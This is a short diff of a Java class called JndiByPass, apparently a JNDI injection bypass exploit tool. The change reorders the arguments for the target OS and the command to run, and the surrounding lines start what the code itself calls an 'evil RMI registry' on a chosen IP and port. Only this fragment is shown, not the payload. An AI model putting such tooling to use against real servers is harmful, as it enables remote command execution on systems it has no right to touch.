@@ -22,13 +22,13 @@ public class JndiByPass {
                 String ip = args[0];
                 int port = Integer.parseInt(args[1]);
                 String model = args[2];
-                String cmd = args[3];
                 String[] system;
-                if (args[4].contains("win")) {
+                if (args[3].contains("win")) {
                     system = win_cmd;
                 } else {
                     system = linux_cmd;
                 }
+                String cmd = args[4];
                 System.setProperty("java.rmi.server.hostname", ip);
                 System.out.println("Creating evil RMI registry on " + ip + " port " + args[1] + "");
                 Registry registry = LocateRegistry.createRegistry(port);
